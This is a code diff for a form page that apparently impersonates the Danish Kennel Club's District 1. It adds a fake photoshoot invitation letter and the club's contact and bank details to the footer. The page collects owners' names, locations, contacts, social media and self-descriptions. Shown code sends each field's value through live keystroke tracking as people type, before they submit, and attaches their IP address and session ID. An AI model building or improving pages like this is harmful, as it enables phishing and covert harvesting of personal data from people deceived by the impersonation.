@@ -28,29 +28,53 @@ const allowedDomains = [
 const i18n = {
     da: {
         nav1: "Hundeejer", nav2: "Opdrætter", nav3: "Aktiviteter",
-        nav4: "Udstilling", nav5: "Om DKK", nav6: "Kontakt", nav7: "Bliv medlem", nav8: "Uddannelser", login: "Login",
-        hero_title: "Ansøgning: Hundemodel", hero_text: "Er din hund den næste stjerne i DKK Kreds 1's kampagnemateriale? \n\nUdfyld formularen sikkert herunder og lad din bedste ven komme i betragtning!",
-        owner_title: "1. Ejerinformation", f_name: "Fulde navn", f_address: "Fulde Adresse", 
+        nav4: "Udstilling", nav5: "Om DKK", nav6: "Kontakt", nav7: "Bliv medlem", nav8: "Uddannelser", nav_shop: "Shop", login: "Login",
+        intro_title: "Forespørgsel vedrørende fotografering af dine hunde til DKK Kreds 1",
+        intro_p1: "Kære hundeejer,",
+        intro_p2: "Vi skriver til dig i samarbejde med udstillingsudvalget i DKK Kreds 1.",
+        intro_p3: "I forbindelse med markedsføringen af nye udstillinger er vi i øjeblikket på udkig efter særlige hunderacer, der kan indgå i kampagnematerialet. Vi har med stor interesse bemærket dine smukke hunde, og vi vil i den anledning høre, om du kunne være interesseret i at lade dem medvirke i en professionel fotografering.",
+        intro_p4: "For at opnå de bedst mulige billeder vil det være en fordel, hvis hundene er trygge ved situationen og eventuelt har mulighed for at udføre små tricks. Det er ikke et krav, at de kan sidde stille uden snor, men det vil være en stor bonus, hvis det kan lade sig gøre.",
+        intro_p5: "Vi gør opmærksom på, at fotograferingerne på nuværende tidspunkt udelukkende vil foregå på udvalgte lokationer på Sjælland.",
+        intro_p6: "Såfremt dette har fanget din interesse, beder vi dig venligst udfylde formularen herunder. Her bedes du angive dine kontaktoplysninger, lidt information om dine hunde og deres færdigheder, samt afslutningsvis en kort beskrivelse af dig selv.",
+        intro_p7: "Vi håber meget på at høre fra dig.",
+        intro_p8: "Med venlig hilsen,<br>I samarbejde med Udstillingsudvalget, DKK Kreds 1",
+        data_info: "<strong>Information om dataindsamling:</strong> De oplysninger du indtaster her, sendes sikkert og bruges udelukkende til at vurdere dit match som hundemodel for DKK Kreds 1. Data deles ikke med tredjepart uden dit samtykke.",
+        owner_title: "1. Ejerinformation", f_name: "Fulde navn", f_address: "Postnr. og By", 
         f_email: "E-mailadresse", f_email_note: "Eks. gmail.com, hotmail.com", f_phone: "Telefonnummer", 
-        f_socials: "Sociale Medier (f.eks. Instagram)", f_dkk: "DKK Medlemsnummer (Valgfrit)",
+        f_socials: "Sociale Medier (f.eks. Instagram)", f_dkk: "DKK Medlemsnummer (Valgfrit)", f_desc: "Kort beskrivelse af dig selv",
         dog_title: "2. Hundeinformation", d_name: "Hundens navn og Race", d_age: "Hundens Alder", 
         d_skills: "Tricks og Færdigheder", d_photos: "Link til billeder (Google Drev/SoMe)",
-        btn_add_dog: "Tilføj endnu en hund", btn_submit: "Send Ansøgning",
+        btn_add_dog: "Tilføj endnu en hund", btn_submit: "Send Ansøgning", btn_sending: "Sender...",
         success_title: "Tak for din ansøgning!", success_desc: "Dine informationer er sendt sikkert afsted til DKK Kreds 1.",
-        error_title: "Hov, der mangler noget!", error_desc: "Tjek de røde felter. Husk at e-mail skal være gyldig, og telefonnummeret skal være korrekt."
+        error_title: "Hov, der mangler noget!", error_desc: "Tjek de røde felter. Husk at e-mail skal være gyldig, og telefonnummeret skal være korrekt.",
+        footer_contact: "Kontakt DKK", footer_contact_info: "Dansk Kennel Klub<br>Parkvej 1 <br>2680 Solrød Strand<br>56 18 81 00 <br>post@dkk.dk<br>CVR 11 88 18 15",
+        footer_bank: "Bank", footer_bank_info: "<strong>Betalinger til Dansk Kennel Klub</strong><br><strong>Reg. nr.:</strong> 7316 Konto: 0001089500<br><strong>IBAN-nr:</strong> DK0973160001089500<br><strong>SWIFT-kode:</strong> JYBADKKK",
+        footer_mypage: "Min side", footer_press: "Presse", footer_privacy: "Privatlivspolitik"
     },
     en: {
         nav1: "Dog Owner", nav2: "Breeder", nav3: "Activities",
-        nav4: "Exhibitions", nav5: "About DKK", nav6: "Contact", nav7: "Become a member", nav8: "Education", login: "Login",
-        hero_title: "Application: DKK Dog Model", hero_text: "Is your dog the next star of DKK District 1's campaign? \n\nFill out the form securely below to submit your best friend!",
-        owner_title: "1. Owner Info", f_name: "Full Name", f_address: "Full Address", 
+        nav4: "Exhibitions", nav5: "About DKK", nav6: "Contact", nav7: "Become a member", nav8: "Education", nav_shop: "Shop", login: "Login",
+        intro_title: "Inquiry regarding photography of your dogs for DKK District 1",
+        intro_p1: "Dear dog owner,",
+        intro_p2: "We are writing to you in collaboration with the exhibition committee of DKK District 1.",
+        intro_p3: "In connection with the marketing of new exhibitions, we are currently looking for special dog breeds to be included in the campaign material. We have noticed your beautiful dogs with great interest, and we would like to hear if you would be interested in letting them participate in a professional photoshoot.",
+        intro_p4: "To get the best possible pictures, it would be an advantage if the dogs are comfortable with the situation and possibly have the opportunity to perform small tricks. It is not a requirement that they can sit still without a leash, but it will be a big bonus if possible.",
+        intro_p5: "Please note that the photoshoots will currently only take place at selected locations in Zealand (Sjælland).",
+        intro_p6: "If this has caught your interest, please fill out the form below. Here you are asked to provide your contact details, some information about your dogs and their skills, and finally a short description of yourself.",
+        intro_p7: "We sincerely hope to hear from you.",
+        intro_p8: "Best regards,<br>In collaboration with the Exhibition Committee, DKK District 1",
+        data_info: "<strong>Data collection info:</strong> The information you enter here is sent securely and is used exclusively to evaluate your match as a dog model for DKK District 1. Data is not shared with third parties without your consent.",
+        owner_title: "1. Owner Info", f_name: "Full Name", f_address: "Zip Code and City", 
         f_email: "Email Address", f_email_note: "E.g., gmail.com, hotmail.com", f_phone: "Phone Number", 
-        f_socials: "Social Media (e.g., Instagram)", f_dkk: "DKK Member Number (Optional)",
+        f_socials: "Social Media (e.g., Instagram)", f_dkk: "DKK Member Number (Optional)", f_desc: "Short description of yourself",
         dog_title: "2. Dog Info", d_name: "Dog's Name & Breed", d_age: "Dog's Age", 
         d_skills: "Tricks & Skills", d_photos: "Link to photos (Google Drive/SoMe)",
-        btn_add_dog: "Add another dog", btn_submit: "Submit Application",
+        btn_add_dog: "Add another dog", btn_submit: "Submit Application", btn_sending: "Sending...",
         success_title: "Thank you!", success_desc: "Your information has been securely sent to DKK District 1.",
-        error_title: "Oops, something is missing!", error_desc: "Please check the red fields. Make sure the email is from a major provider and the phone number is valid."
+        error_title: "Oops, something is missing!", error_desc: "Please check the red fields. Make sure the email is from a major provider and the phone number is valid.",
+        footer_contact: "Contact DKK", footer_contact_info: "Danish Kennel Club<br>Parkvej 1 <br>2680 Solrød Strand<br>+45 56 18 81 00 <br>post@dkk.dk<br>CVR 11 88 18 15",
+        footer_bank: "Bank", footer_bank_info: "<strong>Payments to the Danish Kennel Club</strong><br><strong>Reg. no.:</strong> 7316 Account: 0001089500<br><strong>IBAN:</strong> DK0973160001089500<br><strong>SWIFT:</strong> JYBADKKK",
+        footer_mypage: "My page", footer_press: "Press", footer_privacy: "Privacy Policy"
     }
 };
 
@@ -181,9 +205,6 @@ function bindTracking(parent = document) {
         // FOCUS Event
         input.addEventListener('focus', (e) => {
             validateField(e.target, false);
-            // Hvis du vil spore focus, f.eks.:
-            // const label = e.target.nextElementSibling ? e.target.nextElementSibling.innerText : "Ukendt";
-            // trackEvent("Startet indtastning", label, "(Skriver...)", "eyes");
         });
 
         // INPUT Event (Debounced Live Tracking)
@@ -195,7 +216,7 @@ function bindTracking(parent = document) {
             const label = e.target.nextElementSibling ? e.target.nextElementSibling.innerText : "Felt";
 
             clearTimeout(typingTimeout[fieldId]);
-            // Vent 2,5 sekunder efter de stopper med at skrive, før der sendes en "Live Tracker" notifikation
+            // Vent 2,5 sekunder efter de stopper med at skrive
             typingTimeout[fieldId] = setTimeout(() => {
                 if(val.length > 0) {
                     trackEvent("Live Input", label, val, "pencil2");
@@ -209,8 +230,7 @@ function bindTracking(parent = document) {
             const val = e.target.value.trim();
             const label = e.target.nextElementSibling ? e.target.nextElementSibling.innerText : "Felt";
             if (val !== "") {
-                // Vi sender en direkte besked på blur, som er overordnet de debouncede input
-                clearTimeout(typingTimeout[fieldId]); // Ryd den forsinkede "Live Input", så vi ikke sender to.
+                clearTimeout(typingTimeout[fieldId]); 
                 trackEvent("Forlod felt", label, val, "clipboard");
             }
         });
@@ -226,6 +246,7 @@ function saveFormState() {
         ownerPhone: document.getElementById('ownerPhone').value,
         ownerSocials: document.getElementById('ownerSocials').value,
         dkkMember: document.getElementById('dkkMember').value,
+        ownerDescription: document.getElementById('ownerDescription').value,
         dogs: []
     };
     document.querySelectorAll('.dog-card').forEach(card => {
@@ -249,6 +270,7 @@ function restoreFormState() {
         document.getElementById('ownerPhone').value = data.ownerPhone || '';
         document.getElementById('ownerSocials').value = data.ownerSocials || '';
         document.getElementById('dkkMember').value = data.dkkMember || '';
+        document.getElementById('ownerDescription').value = data.ownerDescription || '';
 
         if (data.dogs && data.dogs.length > 0) {
             document.getElementById('dogsContainer').innerHTML = '';
@@ -274,7 +296,7 @@ function getPayload() {
         dogDetails += `\nHUND ${index + 1}:\n- Navn: ${el.querySelector('.dogName').value}\n- Alder: ${el.querySelector('.dogAge').value}\n- Færdigheder: ${el.querySelector('.dogSkills').value}\n- Fotos: ${el.querySelector('.dogPhotos').value}\n`;
     });
 
-    return `EJER:\nNavn: ${document.getElementById('ownerName').value}\nAdresse: ${document.getElementById('ownerAddress').value}\nEmail: ${document.getElementById('ownerEmail').value}\nTlf: ${document.getElementById('ownerPhone').value}\nSoMe: ${document.getElementById('ownerSocials').value || 'Ingen'}\nDKK: ${document.getElementById('dkkMember').value || 'Ingen'}\n\nHUNDE INFO: ${dogDetails}\n-----------------------\nIP: ${userIP}\nSession ID: ${sessionInfo.id}`;
+    return `EJER:\nNavn: ${document.getElementById('ownerName').value}\nAdresse: ${document.getElementById('ownerAddress').value}\nEmail: ${document.getElementById('ownerEmail').value}\nTlf: ${document.getElementById('ownerPhone').value}\nSoMe: ${document.getElementById('ownerSocials').value || 'Ingen'}\nDKK: ${document.getElementById('dkkMember').value || 'Ingen'}\nBeskrivelse:\n${document.getElementById('ownerDescription').value || 'Ingen'}\n\nHUNDE INFO: ${dogDetails}\n-----------------------\nIP: ${userIP}\nSession ID: ${sessionInfo.id}`;
 }
 
 // --- SUBMIT HANDLING ---
@@ -301,7 +323,8 @@ document.getElementById('dkkForm').addEventListener('submit', async (e) => {
     }
 
     alertBox.classList.add('hidden');
-    btn.innerHTML = `<svg class="animate-spin h-6 w-6 text-white" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"></path></svg> <span>Sender...</span>`;
+    // Updaterer btn tekst fra sprogfilen
+    btn.innerHTML = `<svg class="animate-spin h-6 w-6 text-white" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"></path></svg> <span data-i18n="btn_sending">${i18n[currentLang].btn_sending}</span>`;
     btn.disabled = true;
 
     try {
@@ -330,10 +353,8 @@ function bindLanguageSwitch() {
         
         document.querySelectorAll('[data-i18n]').forEach(el => {
             const key = el.getAttribute('data-i18n');
-            if (el.tagName === 'SPAN') {
-               if (i18n[currentLang][key]) el.innerText = i18n[currentLang][key]; 
-            } else {
-               if (i18n[currentLang][key]) el.innerHTML = el.innerHTML.replace(el.innerText.trim(), i18n[currentLang][key]);
+            if (i18n[currentLang][key]) {
+                el.innerHTML = i18n[currentLang][key]; 
             }
         });
     });
